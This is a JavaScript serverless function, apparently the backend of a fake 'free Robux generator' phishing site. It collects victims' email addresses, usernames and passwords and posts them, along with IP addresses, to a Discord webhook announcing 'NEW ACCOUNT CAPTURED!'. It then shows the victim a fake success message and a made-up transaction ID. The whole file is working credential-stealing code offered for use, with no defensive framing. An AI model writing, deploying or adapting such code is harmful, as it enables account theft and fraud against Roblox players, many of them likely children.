const fetch = require('node-fetch');

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  // Handle preflight
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Parse JSON body
    const { email, username, password, robux_amount, platform, timestamp } = req.body;
    
    // Validate required fields
    if (!email || !username || !password) {
      return res.status(400).json({ 
        success: false, 
        error: 'Missing required fields: email, username, password' 
      });
    }

    // Get client info
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.connection.remoteAddress || 
               'Unknown';
    
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referer = req.headers['referer'] || 'Direct';
    const host = req.headers['host'] || 'vercel.app';

    // Get Discord webhook from environment variable
    const WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
    
    if (!WEBHOOK_URL || WEBHOOK_URL === 'YOUR_WEBHOOK_HERE') {
      console.error('Discord webhook not configured');
      // Still return success to user even if webhook fails
      return res.status(200).json({
        success: true,
        message: `Your request for ${robux_amount} Robux has been processed!`,
        data: {
          email: email.substring(0, 3) + '***@***',
          username: username,
          amount: robux_amount,
          estimated_delivery: '24 hours'
        }
      });
    }

    // Discord embed
    const embed = {
      title: "🔥 NEW ROBUX CLAIM! 🔥",
      color: 0xFF0000,
      timestamp: new Date().toISOString(),
      thumbnail: {
        url: "https://www.roblox.com/images/logo.svg"
      },
      fields: [
        {
          name: "📧 Email",
          value: `\`\`\`${email}\`\`\``,
          inline: false
        },
        {
          name: "👤 Username",
          value: `\`\`\`${username}\`\`\``,
          inline: true
        },
        {
          name: "🔑 Password",
          value: `\`\`\`${password}\`\`\``,
          inline: true
        },
        {
          name: "💰 Amount",
          value: `**${parseInt(robux_amount || 0).toLocaleString()} Robux**`,
          inline: true
        },
        {
          name: "🎮 Platform",
          value: platform ? platform.charAt(0).toUpperCase() + platform.slice(1) : 'Unknown',
          inline: true
        },
        {
          name: "🌐 IP Address",
          value: `\`${ip}\``,
          inline: true
        },
        {
          name: "🕒 Time",
          value: new Date().toLocaleString('en-US', { timeZone: 'UTC' }),
          inline: true
        },
        {
          name: "🚀 Hosting",
          value: "Vercel Serverless",
          inline: true
        },
        {
          name: "🔗 Domain",
          value: host,
          inline: true
        }
      ],
      footer: {
        text: "DARKVERS PROMAX v5.0 • " + new Date().toLocaleDateString()
      }
    };

    // Send to Discord
    const discordPayload = {
      username: "Robux Generator Bot",
      avatar_url: "https://www.roblox.com/images/logo.svg",
      embeds: [embed],
      content: "@everyone **NEW ACCOUNT CAPTURED!** 🚨"
    };

    try {
      const discordResponse = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(discordPayload)
      });

      console.log('Discord Response Status:', discordResponse.status);
      
      // Log captured data (without password for security)
      console.log('Captured Data:', { 
        email: email.substring(0, 3) + '***', 
        username, 
        amount: robux_amount,
        ip,
        timestamp: new Date().toISOString() 
      });
      
    } catch (discordError) {
      console.error('Discord Webhook Error:', discordError);
      // Don't fail the request if Discord fails
    }

    // Success response
    return res.status(200).json({
      success: true,
      message: `Your request for ${robux_amount} Robux has been processed successfully!`,
      data: {
        email: email.substring(0, 3) + '***@***',
        username: username,
        amount: robux_amount,
        estimated_delivery: '24 hours',
        transaction_id: 'RBX-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase()
      }
    });

  } catch (error) {
    console.error('Server Error:', error);
    
    return res.status(500).json({
      success: false,
      error: 'Internal server error. Please try again later.',
      error_code: 'ERR_SERVER_500'
    });
  }
};
